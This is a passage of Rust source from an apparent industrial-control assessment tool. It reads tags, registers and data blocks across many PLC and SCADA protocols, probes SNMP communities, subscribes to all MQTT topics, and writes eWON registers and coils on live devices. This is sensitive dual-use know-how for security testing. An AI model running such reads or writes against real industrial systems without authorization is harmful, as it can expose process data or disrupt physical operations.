                "Probing DB1â€“DB200 on {ip} (worst case: 200 Ã— {timeout} s on filtered hosts)â€¦"
            ));
            let pb = crate::display::spinner_start(&format!("Listing S7 data blocks on {ip}â€¦"));
            let blocks = s7comm::list_data_blocks(ip, s7_port, timeout, password.as_deref());
            pb.finish_and_clear();
            if blocks.is_empty() {
                bail!("No S7 data blocks returned.");
            }
            let limit = tag_limit(blocks.len());
            for (db_num, len) in blocks.iter().take(limit) {
                println!("  DB{db_num:<4}  ({len} bytes)");
            }
            if cache {
                let points: Vec<(String, String)> = blocks
                    .iter()
                    .map(|(db_num, len)| (format!("tag:DB{db_num}"), format!("{len} bytes")))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("S7 DB"), value.as_str()))
                    .collect();
                cache_live_points(ip, Protocol::Siemens, s7_port, &refs)?;
            }
            print_hidden(blocks.len(), limit);
            crate::display::print_success(&format!("{} data block(s).", blocks.len()));
        }
        Some(Protocol::Mitsubishi) => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            let pb =
                crate::display::spinner_start(&format!("Reading Mitsubishi D registers on {ip}â€¦"));
            let result = slmp::read_word_devices(ip, slmp_port, "D", 0, 32);
            pb.finish_and_clear();
            let vals = result?;
            let limit = tag_limit(vals.len());
            for (i, v) in vals.iter().take(limit).enumerate() {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("D{i:<4}")),
                    crate::display::decoded_value(&v.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = vals
                    .iter()
                    .enumerate()
                    .map(|(i, value)| (format!("d:{i}"), value.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, Protocol::Mitsubishi, slmp_port, &refs)?;
            }
            print_hidden(vals.len(), limit);
            crate::display::print_success(&format!("{} register(s).", vals.len()));
        }
        Some(Protocol::Omron) => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let pb = crate::display::spinner_start(&format!("Reading Omron DM words on {ip}â€¦"));
            let result = fins::read_dm_words(ip, fins_port, 0, 0, 32);
            pb.finish_and_clear();
            let words = result?;
            let limit = tag_limit(words.len());
            for (i, w) in words.iter().take(limit).enumerate() {
                println!(
                    "  {}  {} ({})",
                    crate::display::address(&format!("DM{i:<4}")),
                    crate::display::numeric(&w.to_string()),
                    crate::display::raw(&format!("0x{w:04x}"))
                );
            }
            if cache {
                let points: Vec<(String, String)> = words
                    .iter()
                    .enumerate()
                    .map(|(i, value)| (format!("dm:{i}"), value.to_string()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, Protocol::Omron, fins_port, &refs)?;
            }
            print_hidden(words.len(), limit);
            crate::display::print_success(&format!("{} word(s).", words.len()));
        }
        Some(Protocol::Schneider) => {
            use casket::core::modbus;
            let mb_port = if port == 0 { 502 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading Schneider holding registers on {ip}â€¦"
            ));
            let result = modbus::read_holding_registers(ip, mb_port, 0, 32);
            pb.finish_and_clear();
            let regs = result?;
            let limit = tag_limit(regs.len());
            for r in regs.iter().take(limit) {
                println!(
                    "  {}  {}",
                    crate::display::address(&format!("{:>6}", r.display_addr)),
                    crate::display::decoded_value(&r.value_str)
                );
            }
            if cache {
                let points: Vec<(String, String)> = regs
                    .iter()
                    .map(|r| (format!("hr:{}", r.display_addr), r.value_str.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("UINT16"), value.as_str()))
                    .collect();
                cache_live_points(ip, Protocol::Schneider, mb_port, &refs)?;
            }
            print_hidden(regs.len(), limit);
            crate::display::print_success(&format!("{} register(s).", regs.len()));
        }
        Some(Protocol::Snmp) => {
            use casket::vendors::snmp::{client, enumerate};
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Discovering SNMP community on {ip}â€¦"));
            let community = client::discover_community(ip, snmp_port);
            pb.finish_and_clear();
            let Some(community) = community else {
                bail!("No responding SNMP community found on {ip}:{snmp_port}");
            };
            println!("  Community: {community}");
            let pb2 = crate::display::spinner_start("Reading system info and interfacesâ€¦");
            let info = enumerate::get_system_info(ip, snmp_port, &community);
            let ifaces = enumerate::get_interfaces(ip, snmp_port, &community);
            pb2.finish_and_clear();
            if let Ok(sys) = info {
                println!("  sysName:     {}", sys.name);
                println!("  sysDescr:    {}", sys.descr);
                println!("  sysLocation: {}", sys.location);
                println!("  sysContact:  {}", sys.contact);
            }
            if let Ok(ifs) = ifaces {
                for iface in &ifs {
                    let state = if iface.oper_up { "up" } else { "down" };
                    println!(
                        "  if{:<2}  {:20}  {}  {} Mbps",
                        iface.index, iface.descr, state, iface.speed_mbps
                    );
                }
                crate::display::print_success(&format!("{} interface(s).", ifs.len()));
            }
        }
        Some(Protocol::Modbus) => {
            use casket::core::modbus;
            let mb_port = if port == 0 { 502 } else { port };
            let pb = crate::display::spinner_start(&format!("Reading Modbus registers on {ip}â€¦"));
            let hr = modbus::read_holding_registers(ip, mb_port, 0, 32);
            let coil = modbus::read_coils(ip, mb_port, 0, 32);
            let ir = modbus::read_input_registers(ip, mb_port, 0, 32);
            pb.finish_and_clear();
            let mut total = 0usize;
            let mut shown = 0usize;
            match hr {
                Ok(regs) => {
                    for r in &regs {
                        if shown < COMPACT_TAG_LIMIT || all {
                            println!(
                                "  {}  {}",
                                crate::display::address(&format!("hr:{:<6}", r.display_addr)),
                                crate::display::decoded_value(&r.value_str)
                            );
                        }
                        shown += 1;
                    }
                    if cache {
                        let points: Vec<(String, String)> = regs
                            .iter()
                            .map(|r| (format!("hr:{}", r.display_addr), r.value_str.clone()))
                            .collect();
                        let refs: Vec<(&str, Option<&str>, &str)> = points
                            .iter()
                            .map(|(address, value)| {
                                (address.as_str(), Some("UINT16"), value.as_str())
                            })
                            .collect();
                        cache_live_points(ip, Protocol::Modbus, mb_port, &refs)?;
                    }
                    total += regs.len();
                }
                Err(e) => crate::display::print_warn(&format!("FC3 holding registers: {e:#}")),
            }
            match coil {
                Ok(regs) => {
                    for r in &regs {
                        if shown < COMPACT_TAG_LIMIT || all {
                            println!(
                                "  {}  {}",
                                crate::display::address(&format!("coil:{:<4}", r.display_addr)),
                                crate::display::boolean(&r.value_str)
                            );
                        }
                        shown += 1;
                    }
                    if cache {
                        let points: Vec<(String, String)> = regs
                            .iter()
                            .map(|r| (format!("coil:{}", r.display_addr), r.value_str.clone()))
                            .collect();
                        let refs: Vec<(&str, Option<&str>, &str)> = points
                            .iter()
                            .map(|(address, value)| {
                                (address.as_str(), Some("BOOL"), value.as_str())
                            })
                            .collect();
                        cache_live_points(ip, Protocol::Modbus, mb_port, &refs)?;
                    }
                    total += regs.len();
                }
                Err(e) => crate::display::print_warn(&format!("FC1 coils: {e:#}")),
            }
            match ir {
                Ok(regs) => {
                    for r in &regs {
                        if shown < COMPACT_TAG_LIMIT || all {
                            println!(
                                "  {}  {}",
                                crate::display::address(&format!("ir:{:<6}", r.display_addr)),
                                crate::display::decoded_value(&r.value_str)
                            );
                        }
                        shown += 1;
                    }
                    if cache {
                        let points: Vec<(String, String)> = regs
                            .iter()
                            .map(|r| (format!("ir:{}", r.display_addr), r.value_str.clone()))
                            .collect();
                        let refs: Vec<(&str, Option<&str>, &str)> = points
                            .iter()
                            .map(|(address, value)| {
                                (address.as_str(), Some("UINT16"), value.as_str())
                            })
                            .collect();
                        cache_live_points(ip, Protocol::Modbus, mb_port, &refs)?;
                    }
                    total += regs.len();
                }
                Err(e) => crate::display::print_warn(&format!("FC4 input registers: {e:#}")),
            }
            if total > 0 {
                print_hidden(total, shown.min(total));
                crate::display::print_success(&format!("{total} register(s) total."));
            }
        }
        Some(Protocol::Bacnet) => {
            use casket::vendors::bacnet::client;
            let bacnet_port = if port == 0 { client::BACNET_PORT } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading BACnet properties on {ip}:{bacnet_port}â€¦"
            ));
            let dev = client::scan_ip_with_port(ip, bacnet_port, timeout);
            pb.finish_and_clear();
            match dev {
                None => crate::display::print_warn("No BACnet device responded."),
                Some(d) => {
                    println!("  instance_id:       {}", d.instance_id);
                    println!("  vendor_name:       {}", d.vendor_name);
                    println!("  object_name:       {}", d.object_name);
                    println!("  description:       {}", d.description);
                    println!("  firmware_revision: {}", d.firmware_revision);
                    crate::display::print_success("BACnet device properties read.");
                }
            }
        }
        Some(Protocol::Dnp3) => {
            use casket::vendors::dnp3::client;
            let pb = crate::display::spinner_start(&format!("Reading DNP3 attributes on {ip}â€¦"));
            let dnp3_port = if port == 0 { 20_000 } else { port };
            let attrs = client::read_device_attributes_with_port(
                ip,
                dnp3_port,
                std::time::Duration::from_secs(timeout),
            );
            pb.finish_and_clear();
            if attrs.is_empty() {
                crate::display::print_warn("No DNP3 device attributes returned.");
            } else {
                for (k, v) in &attrs {
                    println!("  {k}: {v}");
                }
                crate::display::print_success(&format!("{} attribute(s).", attrs.len()));
            }
        }
        Some(Protocol::OpcUa) => {
            use casket::vendors::opcua::client;
            let opcua_port = if port == 0 { 4840 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Reading OPC-UA endpoints on {ip}:{opcua_port}â€¦"
            ));
            let endpoints = client::get_endpoints_checked(
                ip,
                opcua_port,
                std::time::Duration::from_secs(timeout),
            );
            pb.finish_and_clear();
            match endpoints {
                Err(reason) => crate::display::print_warn(&format!(
                    "OPC-UA endpoint discovery failed: {reason}"
                )),
                Ok(endpoints) if endpoints.is_empty() => {
                    crate::display::print_warn("OPC-UA server returned no endpoints.");
                }
                Ok(endpoints) => {
                    for (i, ep) in endpoints.iter().enumerate() {
                        println!("  [ep{i}] {}", ep.url);
                        println!("        security_mode:   {}", ep.security_mode);
                        println!("        security_policy: {}", ep.security_policy);
                        println!(
                            "        anonymous_access: {}",
                            if ep.allows_anonymous { "yes" } else { "no" }
                        );
                    }
                    crate::display::print_success(&format!("{} endpoint(s).", endpoints.len()));
                }
            }
        }
        Some(Protocol::Enip) => {
            bail!("EtherNet/IP tag enumeration requires --protocol rockwell (CIP List Tags)");
        }
        None => bail!("'--protocol <PROTO>' required for 'get tags'"),
    }
    Ok(())
}

const EWON_DEFAULT_UNIT_ID: u8 = 100;

fn ewon_modbus_port(port: u16) -> u16 {
    casket::core::modbus::effective_port(port)
}

fn validate_ewon_unit_id(unit_id: u8) -> Result<()> {
    if !(1..=247).contains(&unit_id) {
        bail!(
            "eWON Modbus unit id {unit_id} is invalid; use a value from 1 through 247 (Flexy default: {EWON_DEFAULT_UNIT_ID})"
        );
    }
    Ok(())
}

fn ewon_register_word_count(kind: EwonRegisterType) -> u16 {
    match kind {
        EwonRegisterType::U16 | EwonRegisterType::I16 => 1,
        EwonRegisterType::U32 | EwonRegisterType::I32 | EwonRegisterType::F32 => 2,
    }
}

fn decode_ewon_register(words: &[u16], kind: EwonRegisterType) -> Result<String> {
    let required = usize::from(ewon_register_word_count(kind));
    if words.len() < required {
        bail!(
            "eWON Modbus response returned {} word(s), expected {required}",
            words.len()
        );
    }
    let value = match kind {
        EwonRegisterType::U16 => words[0].to_string(),
        EwonRegisterType::I16 => i16::from_ne_bytes(words[0].to_ne_bytes()).to_string(),
        // eWON Flexy publishes 32-bit values as low word, then high word.
        EwonRegisterType::U32 => {
            let bits = u32::from(words[0]) | (u32::from(words[1]) << 16);
            bits.to_string()
        }
        EwonRegisterType::I32 => {
            let bits = u32::from(words[0]) | (u32::from(words[1]) << 16);
            i32::from_ne_bytes(bits.to_ne_bytes()).to_string()
        }
        EwonRegisterType::F32 => {
            let bits = u32::from(words[0]) | (u32::from(words[1]) << 16);
            let value = f32::from_bits(bits);
            if !value.is_finite() {
                bail!("eWON Modbus value is not a finite f32")
            }
            value.to_string()
        }
    };
    Ok(value)
}

fn encode_ewon_register(value: &str, kind: EwonRegisterType) -> Result<Vec<u16>> {
    let value = value.trim();
    let words = match kind {
        EwonRegisterType::U16 => vec![value
            .parse::<u16>()
            .map_err(|_| anyhow::anyhow!("invalid u16 value '{value}'"))?],
        EwonRegisterType::I16 => vec![u16::from_ne_bytes(
            value
                .parse::<i16>()
                .map_err(|_| anyhow::anyhow!("invalid i16 value '{value}'"))?
                .to_ne_bytes(),
        )],
        EwonRegisterType::U32 => {
            let bits = value
                .parse::<u32>()
                .map_err(|_| anyhow::anyhow!("invalid u32 value '{value}'"))?;
            vec![
                u16::try_from(bits & 0xffff).unwrap_or_default(),
                u16::try_from(bits >> 16).unwrap_or_default(),
            ]
        }
        EwonRegisterType::I32 => {
            let bits = value
                .parse::<i32>()
                .map_err(|_| anyhow::anyhow!("invalid i32 value '{value}'"))?;
            let bits = u32::from_ne_bytes(bits.to_ne_bytes());
            vec![
                u16::try_from(bits & 0xffff).unwrap_or_default(),
                u16::try_from(bits >> 16).unwrap_or_default(),
            ]
        }
        EwonRegisterType::F32 => {
            let parsed = value
                .parse::<f32>()
                .map_err(|_| anyhow::anyhow!("invalid f32 value '{value}'"))?;
            if !parsed.is_finite() {
                bail!("eWON f32 value must be finite")
            }
            let bits = parsed.to_bits();
            vec![
                u16::try_from(bits & 0xffff).unwrap_or_default(),
                u16::try_from(bits >> 16).unwrap_or_default(),
            ]
        }
    };
    Ok(words)
}

fn get_ewon_register(
    ip: &str,
    port: u16,
    address: u16,
    kind: EwonRegisterType,
    unit_id: u8,
    cache: bool,
) -> Result<()> {
    use casket::core::modbus;
    validate_ewon_unit_id(unit_id)?;
    let port = ewon_modbus_port(port);
    let count = ewon_register_word_count(kind);
    let registers = modbus::read_holding_registers_with_unit_id(ip, port, unit_id, address, count)?;
    let words: Vec<u16> = registers.iter().map(|register| register.raw).collect();
    let value = decode_ewon_register(&words, kind)?;
    println!("  eWON HR{address} ({kind:?}) = {value}");
    if cache {
        cache_ewon_modbus_point(
            ip,
            &format!("ewon:hr:{address}"),
            &format!("{kind:?}"),
            &value,
        )?;
    }
    crate::display::print_success(&format!(
        "{count} eWON Modbus word(s) read from unit {unit_id}."
    ));
    Ok(())
}

fn get_ewon_coil(ip: &str, port: u16, address: u16, unit_id: u8, cache: bool) -> Result<()> {
    use casket::core::modbus;
    validate_ewon_unit_id(unit_id)?;
    let port = ewon_modbus_port(port);
    let coils = modbus::read_coils_with_unit_id(ip, port, unit_id, address, 1)?;
    let value = coils
        .first()
        .context("eWON Modbus coil response was empty")?;
    println!("  eWON coil {address} = {}", value.value_str);
    if cache {
        cache_ewon_modbus_point(
            ip,
            &format!("ewon:coil:{address}"),
            "BOOL",
            &value.value_str,
        )?;
    }
    crate::display::print_success(&format!("eWON Modbus coil read from unit {unit_id}."));
    Ok(())
}

fn cache_ewon_modbus_point(ip: &str, address: &str, data_type: &str, value: &str) -> Result<()> {
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    db.upsert_data_points(ip, "ewon", &[(address, Some(data_type), value)])?;
    Ok(())
}

fn set_ewon_register(
    ip: &str,
    port: u16,
    address: u16,
    value: &str,
    kind: EwonRegisterType,
    unit_id: u8,
) -> Result<()> {
    use casket::core::modbus;
    validate_ewon_unit_id(unit_id)?;
    let port = ewon_modbus_port(port);
    let words = encode_ewon_register(value, kind)?;
    if words.len() == 1 {
        modbus::write_single_register_with_unit_id(ip, port, unit_id, address, words[0])?;
    } else {
        modbus::write_multiple_registers_with_unit_id(ip, port, unit_id, address, &words)?;
    }
    crate::display::print_success(&format!(
        "eWON register HR{address} ({kind:?}) written to unit {unit_id}."
    ));
    Ok(())
}

fn set_ewon_coil(ip: &str, port: u16, address: u16, state: &str, unit_id: u8) -> Result<()> {
    use casket::core::modbus;
    validate_ewon_unit_id(unit_id)?;
    let on = if state.eq_ignore_ascii_case("on") {
        true
    } else if state.eq_ignore_ascii_case("off") {
        false
    } else {
        bail!("invalid eWON coil state '{state}': use 'on' or 'off'");
    };
    let port = ewon_modbus_port(port);
    modbus::write_single_coil_with_unit_id(ip, port, unit_id, address, on)?;
    crate::display::print_success(&format!(
        "eWON coil {address} set {} on unit {unit_id}.",
        if on { "ON" } else { "OFF" }
    ));
    Ok(())
}

fn get_tags_ewon(
    ip: &str,
    port: u16,
    username: Option<&str>,
    password: Option<&str>,
    cache: bool,
) -> Result<()> {
    use casket::vendors::ewon::scan;
    let pb = crate::display::spinner_start(&format!("Reading eWON tags from {ip}â€¦"));
    let creds = username.zip(password);
    let result = scan::read_tag_values(ip, port, creds);
    pb.finish_and_clear();
    let tags = result?;
    if tags.is_empty() {
        bail!("No eWON tags returned from {ip}:{port}");
    }
    for (name, val) in &tags {
        println!(
            "  {}: {}",
            crate::display::tag_name(name),
            crate::display::decoded_value(val)
        );
    }
    if cache {
        let points: Vec<(String, String)> = tags
            .iter()
            .map(|(name, value)| (format!("tag:{name}"), value.clone()))
            .collect();
        let refs: Vec<(&str, Option<&str>, &str)> = points
            .iter()
            .map(|(address, value)| (address.as_str(), Some("ewon-tag"), value.as_str()))
            .collect();
        cache_live_points(ip, Protocol::Ewon, port, &refs)?;
    }
    crate::display::print_success(&format!("{} tag(s).", tags.len()));
    Ok(())
}

fn get_tags_mqtt(
    ip: &str,
    port: u16,
    timeout: u64,
    username: Option<String>,
    password: Option<String>,
    cache: bool,
) -> Result<()> {
    use casket::vendors::mqtt::{
        client,
        session::{ConnectOptions, MqttSession},
    };
    let mqtt_port = if port == 0 { client::MQTT_PORT } else { port };
    let pb =
        crate::display::spinner_start(&format!("Subscribing to MQTT broker at {ip}:{mqtt_port}â€¦"));
    let opts = ConnectOptions {
        host: ip.to_string(),
        port: mqtt_port,
        client_id: "scadaver-scan".to_string(),
        username,
        password,
        ..Default::default()
    };
    let result = MqttSession::connect(&opts);
    pb.finish_and_clear();
    let mut sess = result?;
    sess.subscribe("#", 0)?;
    std::thread::sleep(std::time::Duration::from_secs(timeout));
    let msgs = sess.drain_messages();
    let mut topics: Vec<String> = msgs.iter().map(|m| m.topic.clone()).collect();
    topics.sort();
    topics.dedup();
    if topics.is_empty() {
        bail!("No MQTT topics received from {ip}:{mqtt_port} within {timeout} second(s)");
    }
    for topic in &topics {
        println!("  {}", crate::display::tag_name(topic));
    }
    if cache {
        let points: Vec<(String, String)> = topics
            .iter()
            .map(|topic| (format!("topic:{topic}"), "seen".into()))
            .collect();
        let refs: Vec<(&str, Option<&str>, &str)> = points
            .iter()
            .map(|(address, value)| (address.as_str(), Some("mqtt-topic"), value.as_str()))
            .collect();
        cache_live_points(ip, Protocol::Mqtt, mqtt_port, &refs)?;
    }
    crate::display::print_success(&format!("{} topic(s).", topics.len()));
    Ok(())
}

fn get_tags_iec104(ip: &str, port: u16, cache: bool) -> Result<()> {
    use casket::vendors::iec104::client;
    let iec_port = if port == 0 { client::IEC104_PORT } else { port };
    let pb =
        crate::display::spinner_start(&format!("Enumerating IEC 104 objects on {ip}:{iec_port}â€¦"));
    let result =
        client::connect(ip, iec_port).and_then(|mut s| client::general_interrogation(&mut s));
    pb.finish_and_clear();
    let objs = result?;
    if objs.is_empty() {
        bail!("No IEC 104 objects returned from {ip}:{iec_port}");
    }
    for obj in &objs {
        println!(
            "  {}: {}  {}",
            crate::display::address(&format!("IOA {:>6}", obj.ioa)),
            crate::display::type_name(&format!("type=0x{:02x}", obj.type_id)),
            crate::display::decoded_value(&obj.decoded),
        );
    }
    if cache {
        let points: Vec<(String, String, String)> = objs
            .iter()
            .map(|obj| {
                (
                    format!("tag:IOA:{}", obj.ioa),
                    format!("type=0x{:02x}", obj.type_id),
                    obj.decoded.clone(),
                )
            })
            .collect();
        let refs: Vec<(&str, Option<&str>, &str)> = points
            .iter()
            .map(|(address, data_type, value)| {
                (address.as_str(), Some(data_type.as_str()), value.as_str())
            })
            .collect();
        cache_live_points(ip, Protocol::Iec104, iec_port, &refs)?;
    }
    crate::display::print_success(&format!("{} object(s).", objs.len()));
    Ok(())
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
fn get_tag(
    ip: &str,
    port: u16,
    timeout: u64,
    name: &str,
    proto: Option<Protocol>,
    _username: Option<&str>,
    password: Option<&str>,
    cache: bool,
) -> Result<()> {
    match proto {
        Some(Protocol::Rockwell) => {
            use casket::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb = crate::display::spinner_start(&format!("Reading {name}â€¦"));
            let result = driver::read_tag(ip, enip_port, name);
            pb.finish_and_clear();
            let raw = result?;
            let structured_reply = raw.starts_with(&[0xA0, 0x02]);
            let (tag_type, templates) = if structured_reply {
                let tags = driver::enumerate_tags(ip, enip_port)
                    .context("Rockwell tag metadata lookup required to decode a structure")?;
                let tag_type = tags
                    .iter()
                    .find(|tag| tag.name == name)
                    .map(|tag| tag.tag_type)
                    .ok_or_else(|| anyhow::anyhow!("Rockwell tag '{name}' was read but is absent from the symbol catalogue"))?;
                (
                    tag_type,
                    Some(driver::enumerate_templates(ip, enip_port, &tags)),
                )
            } else {
                let (tag_type, _) = decode_rockwell_payload(&raw).with_context(|| {
                    format!("Rockwell Read Tag returned no usable CIP type word for '{name}'")
                })?;
                (tag_type, None)
            };
            let value = driver::decode_value(tag_type, &raw, templates.as_ref());
            println!(
                "  {} = {}  {}  {}",
                crate::display::tag_name(name),
                crate::display::decoded_value(&value),
                crate::display::type_name(&format!("({})", driver::type_name(tag_type))),
                crate::display::access(driver::is_writable_type(tag_type)),
            );
            if cache {
                let db = crate::db::Database::open(&crate::db::Database::default_path())?;
                db.upsert_data_points(
                    ip,
                    "rockwell",
                    &[(
                        &format!("tag:{name}"),
                        Some(driver::type_name(tag_type).as_str()),
                        &value,
                    )],
                )?;
                let fields = serde_json::json!({"port": enip_port, "enip_port": enip_port});
                let _ = cache_scan_observation(ip, "rockwell", enip_port, &fields);
            }
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let pb = crate::display::spinner_start(&format!("Discovering {ip}â€¦"));
            let devs = scan::discover_ip_with_port(ip, timeout, true, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            match scan::read_symbol_value(&dev, &local_netid, name, port) {
                Ok(val) => println!(
                    "  {} = {}",
                    crate::display::tag_name(name),
                    crate::display::decoded_value(&val)
                ),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::webvisit;
            let (_, tags) = webvisit::get_tags(ip, port)?;
            let values = webvisit::read_tag_values(ip, port, &tags)?;
            if let Some((_, val)) = values.iter().find(|(k, _)| k == name) {
                println!(
                    "  {}: {}",
                    crate::display::tag_name(name),
                    crate::display::decoded_value(val)
                );
            } else {
                crate::display::print_warn(&format!("Tag '{name}' not found."));
            }
        }
        Some(Protocol::Siemens) => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            // Accept "DB3" or "DB3:offset:len" â€” default offset=0, len=4
            let (db_num, offset, len) = parse_s7_tag_name(name)?;
            let pb = crate::display::spinner_start(&format!("Reading S7 DB{db_num}â€¦"));
            let result =
                s7comm::read_data_block(ip, db_num, offset, len, s7_port, timeout, password);
            pb.finish_and_clear();
            match result {
                Ok(raw) => println!(
                    "  {} = {}",
                    crate::display::tag_name(&format!("DB{db_num}:{offset}")),
                    crate::display::decoded_value(&crate::display::render_bytes(&raw)),
                ),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Mitsubishi) => {
            use casket::vendors::mitsubishi::slmp;
            let slmp_port = if port == 0 { 5007 } else { port };
            // Accept "D100", "M10", "W1", etc. â€” split at first digit boundary
            let (device, addr) = parse_slmp_tag_name(name)?;
            let pb = crate::display::spinner_start(&format!("Reading {name}â€¦"));
            let result = slmp::read_word_devices(ip, slmp_port, device, u32::from(addr), 1);
            pb.finish_and_clear();
            match result {
                Ok(vals) if !vals.is_empty() => println!(
                    "  {} = {}",
                    crate::display::tag_name(name),
                    crate::display::decoded_value(&vals[0].value_str)
                ),
                Ok(_) => crate::display::print_warn("No value returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Omron) => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            // Accept "DM100" or a plain number â†’ DM address
            let dm_addr: u16 = name
                .trim_start_matches("DM")
                .trim_start_matches("dm")
                .parse()
                .map_err(|_| {
                    anyhow::anyhow!("Invalid Omron DM address '{name}'; use DM<number>")
                })?;
            let pb = crate::display::spinner_start(&format!("Reading {name}â€¦"));
            let result = fins::read_dm_words(ip, fins_port, 0, dm_addr, 1);
            pb.finish_and_clear();
            match result {
                Ok(words) if !words.is_empty() => {
                    println!(
                        "  {} = {} ({})",
                        crate::display::tag_name(name),
                        crate::display::numeric(&words[0].to_string()),
                        crate::display::raw(&format!("0x{:04x}", words[0]))
                    );
                }
                Ok(_) => crate::display::print_warn("No value returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Schneider) => {
            use casket::core::modbus;
            let mb_port = if port == 0 { 502 } else { port };
            // Accept display address (40001) or raw address (0); subtract 40001 if >=40001
            let raw_addr = parse_modbus_addr(name)?;
            let pb = crate::display::spinner_start(&format!("Reading register {name}â€¦"));
            let result = modbus::read_holding_registers(ip, mb_port, raw_addr, 1);
            pb.finish_and_clear();
            match result {
                Ok(regs) if !regs.is_empty() => {
                    println!(
                        "  {} = {}",
                        crate::display::address(&regs[0].display_addr.to_string()),
                        crate::display::decoded_value(&regs[0].value_str)
                    );
                }
                Ok(_) => crate::display::print_warn("No value returned."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Snmp) => {
            use casket::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let community = client::discover_community(ip, snmp_port).ok_or_else(|| {
                anyhow::anyhow!("No responding SNMP community on {ip}:{snmp_port}")
            })?;
            let pb = crate::display::spinner_start(&format!("Reading OID {name}â€¦"));
            let result = client::get(ip, snmp_port, &community, name);
            pb.finish_and_clear();
            match result {
                Ok(val) => println!(
                    "  {} = {}",
                    crate::display::tag_name(name),
                    crate::display::decoded_value(&val.display())
                ),
                Err(e) => {
                    // Retry with SYS_DESCR shorthand if user typed a name instead of OID
                    let resolved = match name {
                        "sysDescr" => Some(oids::SYS_DESCR),
                        "sysName" => Some(oids::SYS_NAME),
                        "sysLocation" => Some(oids::SYS_LOCATION),
                        "sysContact" => Some(oids::SYS_CONTACT),
                        _ => None,
                    };
                    if let Some(oid) = resolved {
                        match client::get(ip, snmp_port, &community, oid) {
                            Ok(val) => println!(
                                "  {} = {}",
                                crate::display::tag_name(name),
                                crate::display::decoded_value(&val.display())
                            ),
                            Err(e2) => crate::display::print_error(&format!("{e2}")),
                        }
                    } else {
                        crate::display::print_error(&format!("{e}"));
                    }
                }
            }
        }
        Some(Protocol::Iec104) => {
            use casket::vendors::iec104::client;
            let iec_port = if port == 0 { client::IEC104_PORT } else { port };
            let ioa: u32 = name
                .trim_start_matches("IOA")
                .trim_start_matches(':')
                .trim_start_matches(' ')
                .parse()
                .map_err(|_| {
                    anyhow::anyhow!("IEC-104 name must be an IOA number, e.g. 100 or IOA:100")
                })?;
            let mut session = client::connect(ip, iec_port)
                .map_err(|e| anyhow::anyhow!("IEC-104 connect to {ip}:{iec_port}: {e}"))?;
            let objects = client::general_interrogation(&mut session)
                .map_err(|e| anyhow::anyhow!("IEC-104 GI failed: {e}"))?;
            if let Some(obj) = objects.iter().find(|o| o.ioa == ioa) {
                println!(
                    "  {} = {}",
                    crate::display::address(&format!("IOA:{ioa}")),
                    crate::display::decoded_value(&obj.decoded)
                );
            } else {
                crate::display::print_warn(&format!(
                    "IOA {ioa} not found in GI response ({} objects).",
                    objects.len()
                ));
            }
        }
        Some(Protocol::Ewon) => {
            let ewon_port = if port == 0 { 80 } else { port };
            match casket::vendors::ewon::scan::read_tag_values(ip, ewon_port, None) {
                Ok(tags) => {
                    if let Some((_, val)) = tags.iter().find(|(k, _)| k == name) {
                        println!(
                            "  {} = {}",
                            crate::display::tag_name(name),
                            crate::display::decoded_value(val)
                        );
                    } else {
                        crate::display::print_warn(&format!(
                            "Tag '{name}' not found ({} tags returned). Check spelling or use 'get tags' to list all.",
                            tags.len()
                        ));
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(Protocol::Mqtt) => {
            use casket::vendors::mqtt::session::{ConnectOptions, MqttSession};
            let mqtt_port = if port == 0 { 1883 } else { port };
            let opts = ConnectOptions {
                host: ip.to_string(),
                port: mqtt_port,
                client_id: "scadaver-gettag".to_string(),
                ..ConnectOptions::default()
            };
            let mut session = MqttSession::connect(&opts)
                .map_err(|e| anyhow::anyhow!("MQTT connect to {ip}:{mqtt_port}: {e}"))?;
            session
                .subscribe(name, 0)
                .map_err(|e| anyhow::anyhow!("MQTT subscribe to '{name}': {e}"))?;
            std::thread::sleep(std::time::Duration::from_secs(timeout.min(5)));
            let msgs = session.drain_messages();
            if let Some(msg) = msgs.iter().find(|m| m.topic == name) {
                let (kind, payload) =
                    casket::vendors::mqtt::attacks::classify_payload(name, &msg.payload);
                let rendered = match kind {
                    "bool" => crate::display::boolean(&payload),
                    "number" => crate::display::numeric(&payload),
                    "binary" | "sparkplug-b" => crate::display::raw(&payload),
